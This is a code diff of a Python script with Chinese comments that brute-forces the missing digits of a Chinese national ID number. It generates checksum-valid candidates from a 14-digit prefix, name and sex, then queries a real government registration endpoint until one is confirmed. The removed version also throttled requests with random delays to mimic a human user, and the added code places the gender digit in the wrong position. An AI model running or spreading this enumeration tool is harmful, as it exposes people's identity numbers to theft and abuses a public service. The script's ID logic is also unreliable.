@@ -1,29 +1,66 @@
 import random
-import requests
-import asyncio
-import aiohttp
 import argparse
-import sys
+import requests
+
+# 创建命令行参数解析器
+parser = argparse.ArgumentParser(description="身份证生成和验证工具")
+parser.add_argument('-ic', '--idcard_prefix', type=str, required=True, help="身份证号码前14位")
+parser.add_argument('--name', '-n', type=str, required=True, help="姓名")
+parser.add_argument('--sex', '-s', type=str, choices=["男", "女"], required=True, help="性别（男/女）")
+
+# 解析命令行参数
+args = parser.parse_args()
+
+# 获取用户输入
+idcard_prefix = args.idcard_prefix
+name = args.name
+gender = args.sex
 
 
-# 生成校验码函数（基于身份证校验规则）
-def calculate_checksum(id_number):
-    weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
-    checksum_list = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
-    total = sum(int(id_number[i]) * weights[i] for i in range(17))
-    return checksum_list[total % 11]
+# 计算第十八位
+def calculate_check_digit(id17):
+    # 系数数组
+    coefficients = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
+    # 校验码数组
+    check_digits = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
+
+    # 计算加权和
+    sum_of_products = sum(int(id17[i]) * coefficients[i] for i in range(17))
+
+    # 计算余数
+    remainder = sum_of_products % 11
+
+    # 返回校验码
+    return check_digits[remainder]
 
 
-# 缓存已验证过的号码
-verified_cache = {}
+# 确定第15位数字，根据性别
+if gender.lower() == "男":
+    idcard_15th = [str(number) for number in range(10) if number % 2 != 0]
+    # print(idcard_15th)
 
+elif gender.lower() == "女":
+    idcard_15th = [str(number) for number in range(10) if number % 2 == 0]
+    # print(idcard_15th)
 
-# 异步请求函数
-async def verify_idcard(session, idcard, name):
-    if idcard in verified_cache:
-        print(f"身份证号码 {idcard} 已缓存结果: {verified_cache[idcard]}")
-        return verified_cache[idcard]
+else:
+    print("性别输入错误，请输入'男'或'女'")
+    exit()
+# 生成15位身份证号列表
+idcard15_list = [idcard_prefix + str(idcard_15th) for idcard_15th in idcard_15th]
+# print(idcard15_list)
+idcard_1617 = [idcard + f'{i:02d}' for idcard in idcard15_list for i in range(0, 99)]
+# print(idcard_1617)
+# 为每个17位号码计算并添加校验位
 
+generated_idcards = [idcard + calculate_check_digit(idcard) for idcard in idcard_1617]
+# print(generated_idcards)
+# # 输出结果
+for idcard in generated_idcards:
+    print(f"Generated ID card: {idcard}")
+
+# 验证身份证号码
+for idcard in generated_idcards:
     headers = {
         'Host': 'www.renshenet.org.cn',
         'Accept': 'application/json, text/plain, */*',
@@ -47,58 +84,12 @@ async def verify_idcard(session, idcard, name):
     }
 
     try:
-        async with session.post('https://www.renshenet.org.cn/mobile/person/register/checkidcard', headers=headers,
-                                json=data) as response:
-            result = await response.json()
-            if result["data"]["isSucces"]:
-                print(f"身份证号码 {idcard} ✅验证通过")
-                verified_cache[idcard] = True
-            else:
-                print(f"身份证号码 {idcard} ❌验证未通过")
-                verified_cache[idcard] = False
-    except Exception as e:
+        response = requests.post('https://www.renshenet.org.cn/mobile/person/register/checkidcard', headers=headers,
+                                 json=data)
+        response.raise_for_status()  # 对于错误响应引发异常
+        if response.json().get("data", {}).get("isSucces"):
+            print(f"身份证号码 {idcard} ✅验证通过")
+        else:
+            print(f"身份证号码 {idcard} ❌验证未通过")
+    except requests.exceptions.RequestException as e:
         print(f"请求错误: {e}")
-        verified_cache[idcard] = False
-
-
-# 使用 argparse 模块处理命令行输入
-parser = argparse.ArgumentParser(description="身份证生成和验证工具")
-parser.add_argument('-ic', '--idcard_prefix', type=str, required=True, help="身份证号码前14位")
-parser.add_argument('--name', '-n', type=str, required=True, help="姓名")
-parser.add_argument('--sex', '-s', type=str, choices=["男", "女"], required=True, help="性别（男/女）")
-
-# 如果没有提供参数，显示帮助信息
-if len(sys.argv) == 1:
-    parser.print_help()
-    sys.exit(1)
-
-args = parser.parse_args()
-
-# 根据性别生成身份证号码的第17位
-if args.sex == "男":
-    idcard_17th = str(random.randint(1, 9))
-elif args.sex == "女":
-    idcard_17th = str(random.randint(0, 8))
-else:
-    print("性别输入错误，请输入'男'或'女'")
-    sys.exit(1)
-
-idcard_suffixes = [str(random.randint(0, 999)).zfill(3) for _ in range(100)]
-
-async def main_logic():
-    async with aiohttp.ClientSession() as session:
-        for suffix in idcard_suffixes:
-            idcard_without_checksum = args.idcard_prefix + idcard_17th + suffix
-            checksum = calculate_checksum(idcard_without_checksum)
-            idcard = idcard_without_checksum + checksum
-
-            # 设置请求频率限制，最多每秒处理3个请求
-            await verify_idcard(session, idcard, args.name)
-
-            # 加入随机延时，模拟用户行为
-            delay = random.uniform(0.5, 2)  # 随机延时 0.5 到 2 秒之间
-            print(f"等待 {delay:.2f} 秒...")
-            await asyncio.sleep(delay)
-
-# 运行异步逻辑
-asyncio.run(main_logic())
